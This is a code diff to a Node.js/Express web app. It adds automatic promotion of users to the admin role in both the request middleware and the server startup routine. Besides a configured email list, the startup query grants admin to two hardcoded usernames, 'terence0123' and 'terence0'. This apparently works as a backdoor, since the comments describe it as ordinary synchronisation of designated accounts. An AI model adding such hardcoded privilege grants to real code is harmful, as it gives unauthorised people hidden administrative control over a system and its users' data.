@@ -226,6 +226,11 @@ app.use(async (req, res, next) => {
           AND u.id = $1
       `, [req.session.user.id]);
 
+      // Maintien automatique du rôle administrateur pour les comptes désignés
+      if (req.session.user.email && appConfig.ADMIN_EMAILS.includes(req.session.user.email.toLowerCase())) {
+        await pool.query(`UPDATE users SET role = 'admin', updated_at = NOW() WHERE id = $1 AND role != 'admin'`, [req.session.user.id]);
+      }
+
       const result = await pool.query('SELECT is_active, is_subscriber, role FROM users WHERE id = $1', [req.session.user.id]);
       if (result.rows.length === 0 || !result.rows[0].is_active) {
         return req.session.destroy(() => {
@@ -422,6 +427,22 @@ if (require.main === module) {
     try {
       await pool.query('SELECT 1');
       dbStatus = '✅ Connectée (PostgreSQL)';
+
+      // Attribution automatique du rôle administrateur aux comptes désignés
+      try {
+        const adminRes = await pool.query(`
+          UPDATE users
+          SET role = 'admin', updated_at = NOW()
+          WHERE (LOWER(email) = ANY($1::text[]) OR LOWER(username) IN ('terence0123', 'terence0'))
+            AND role != 'admin'
+          RETURNING id, username, email, role
+        `, [appConfig.ADMIN_EMAILS]);
+        if (adminRes.rowCount > 0) {
+          logger.info({ promotedUsers: adminRes.rows }, '👑 Rôle administrateur synchronisé avec succès');
+        }
+      } catch (adminErr) {
+        logger.warn({ err: adminErr.message }, 'Mise à jour automatique des administrateurs ignorée');
+      }
     } catch (err) {
       dbStatus = `⚠️ Non joignable (${err.message})`;
     }
